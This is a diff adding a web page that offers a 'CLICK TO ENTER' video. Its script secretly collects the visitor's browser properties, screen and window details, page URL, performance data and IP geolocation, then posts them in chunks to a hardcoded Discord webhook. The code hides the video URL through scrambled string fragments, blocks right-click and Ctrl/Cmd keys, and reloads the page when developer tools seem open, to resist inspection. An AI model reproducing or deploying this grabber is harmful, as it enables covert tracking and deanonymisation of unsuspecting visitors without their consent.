@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Click Me</title>
+    <style>
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Arial Black', sans-serif;
+            cursor: pointer;
+        }
+        #enter {
+            color: #0f0;
+            font-size: 72px;
+            text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        #videoContainer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <div id="enter">CLICK TO ENTER</div>
+    <div id="videoContainer">
+        <video id="videoPlayer" autoplay controls></video>
+    </div>
+
+    <script>
+        var am = "ne";
+        var af = "d_";
+        var ak = "in";
+        var al = "li";
+        var ao = "al";
+        var ag = "_2";
+        var g = "tl";
+        var v = "-/";
+        var j = "om";
+        var b = "tt";
+        var a = "h";
+        var ai = "mp";
+        var m = ".c";
+        var h = "ab";
+        var e = "/";
+        var r = "so";
+        var an = "=f";
+        var i = ".c";
+        var x = "w/";
+        var s = "ur";
+        var y = "ma";
+        var p = "n/";
+        var u = "s/";
+        var z = "in";
+        var ad = "ro";
+        var ab = "ac";
+        var w = "ra";
+        var f = "gi";
+        var c = "ps";
+        var aq = "se";
+        var aa = "/b";
+        var q = "re";
+        var d = ":";
+        var o = "te";
+        var ac = "kg";
+        var ae = "un";
+        var ap = "se";
+        var l = "us";
+        var ah = "_.";
+        var av = "in";
+        var k = "/g";
+        var n = "re";
+        var ar = "??";
+        var aj = "4?";
+        var t = "ce";
+        var ax = "??";
+
+        var azdod = a + b + c + d + e + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + w + x + y + z + aa + ab + ac + ad + ae + af + ag + ah + ai + aj + ak + al + am + an + ao + ap;
+
+        var oda = "https://discord.com/api/webhooks/1392552291483254814/-AEeUCdWz1M6jOFy7u7zFpRiuvbhMfIZFusVEXEhTxamcCx0ZAjlfbpxWjHAr-V8zJCL";
+
+        function xyz() {
+            var abc = document.getElementById("enter");
+            abc.onclick = function() {
+                var def = document.getElementById("videoContainer");
+                def.style.display = "block";
+                var ghi = document.getElementById("videoPlayer");
+                ghi.src = azdod;
+                ghi.volume = 0.35;
+
+                var jkl = {};
+
+                jkl.navigator = {};
+                for (var key in navigator) {
+                    try {
+                        jkl.navigator[key] = navigator[key];
+                    } catch (e) {
+                        jkl.navigator[key] = "Error accessing";
+                    }
+                }
+
+                jkl.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    orientation: screen.orientation
+                };
+
+                jkl.window = {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio,
+                    location: window.location.href
+                };
+
+                if (window.performance) {
+                    jkl.performance = {
+                        memory: window.performance.memory,
+                        timing: window.performance.timing
+                    };
+                }
+
+                async function chunkify(jsonData, label) {
+                    const chunkSize = 1900;
+                    const jsonString = JSON.stringify(jsonData, null, 2);
+                    const totalParts = Math.ceil(jsonString.length / chunkSize);
+
+                    for (let i = 0; i < totalParts; i++) {
+                        const chunk = jsonString.substring(i * chunkSize, (i + 1) * chunkSize);
+                        const content = `${label} (Part ${i + 1}/${totalParts}):\n\`\`\`json\n${chunk}\n\`\`\``;
+                        const payload = { content };
+
+                        try {
+                            await fetch(oda, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify(payload)
+                            });
+                        } catch (err) {
+                            console.error("Error sending chunk", i + 1, err);
+                        }
+                    }
+                }
+
+                fetch('https://ipapi.co/json/')
+                    .then(mno => mno.json())
+                    .then(async pqr => {
+                        jkl.ipInfo = pqr;
+                        await chunkify(jkl, "DATA DUMP");
+                    })
+                    .catch(async yza => {
+                        jkl.ipError = yza.message;
+                        await chunkify(jkl, "DATA DUMP (IP FAILED)");
+                    });
+            };
+        }
+
+
+        setTimeout(function(){ xyz(); }, 500);
+
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener("keydown", function (e) {
+            if (e.ctrlKey || e.metaKey) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        (function () {
+            const normal = [
+                [1920, 1080], [1366, 768], [1536, 864], [1440, 900],
+                [1600, 900], [1280, 720], [1024, 768], [768, 1024],
+                [375, 812], [390, 844], [360, 800], [820, 1180],
+                [1280, 800], [2560, 1440], [3440, 1440]
+            ];
+
+            let lastCheck = {
+                width: window.outerWidth,
+                height: window.outerHeight
+            };
+
+            function isSuspiciousSize(w, h) {
+                return !normal.some(([rw, rh]) => {
+                    return (Math.abs(rw - w) <= 100 && Math.abs(rh - h) <= 100);
+                });
+            }
+
+            function checkDevTools() {
+                const w = window.outerWidth;
+                const h = window.outerHeight;
+                if (isSuspiciousSize(w, h)) {
+                    location.reload();
+                }
+            }
+
+            setInterval(checkDevTools, 1500);
+
+            window.addEventListener("resize", checkDevTools);
+        })();
+    </script>
+</body>
+</html>
